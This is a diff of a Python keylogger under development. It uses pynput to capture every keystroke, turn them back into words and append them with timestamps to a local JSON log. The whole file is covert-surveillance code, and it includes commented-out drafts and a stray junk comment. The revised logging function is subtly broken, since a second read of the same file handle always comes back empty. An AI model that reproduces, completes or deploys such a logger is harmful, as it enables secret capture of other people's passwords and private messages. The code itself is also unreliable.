@@ -3,14 +3,14 @@ from pynput.keyboard import Key, Listener
 from datetime import datetime
 import json
 
-count, keys, fianl_log = 0, [], {'date': 'keys go here', 'date1': 'did it work?', 'date2': 'is it just doing the last one?'}
+count, keys, fianl_log = 0, [], {}
 
 def on_press(key):
 	global keys, count
 	keys.append(key)
 	count += 1
 
-	if count > 20 and 'space' in str(keys[-1]): #change to a bigger number for the final version
+	if count > 20 and 'space' in str(keys[-1]):
 		words = ''
 		for key in keys:
 			k = str(key).replace("'", '')
@@ -18,28 +18,45 @@ def on_press(key):
 				words += ' '
 			elif k.find('Key') == -1:
 				words += k
-			else:
-				pass #words += ' '+k[4:]+' '
-		write_file(keys)
-		write_log({str(datetime.now()): words})
+
+		date = datetime.now()
+		write_log({date.strftime('%c'): words})
 		count, keys = 0, []
 
+'''
+def write_log(input_):
+	with open("tester.json", "a") as jf:
+		json.dump(input_, jf)
+'''
+#ssssssssssssssssssssssssssssssssssssss ererere   
+'''
 
 def write_log(input_):
-	with open("tester.json", "a") as jf: 
-		json.dump(input_, jf)
-		
+	with open("tester.json") as read_log:
+		print(read_log.read())
+		try:
+			temp_log = json.load(read_log)
+			temp_log.update(input_)
+		except:
+			temp_log = input_
+	with open("tester.json", "w") as write_log:
+		json.dump(temp_log, write_log)
 
-def write_file(keys):
-	with open('log.txt', 'a') as f:
-		for key in keys:
-			k = str(key).replace("'", '')
-			if k.find('space') > 0:
-				f.write(str(' '))
-			elif k.find('Key') == -1:
-				f.write(k)
-			else:
-				f.write(' '+k[4:]+' ')
+'''
+def write_log(input_):
+	with open("tester.json") as read_log:
+		print(read_log.read())
+		if read_log.read():
+			temp_log = json.load(read_log)
+			temp_log.update(input_)
+		else:
+			temp_log = input_
+	with open("tester.json", "w") as write_log:
+		json.dump(temp_log, write_log)
+
+
+
+
 
 
 def on_release(key):
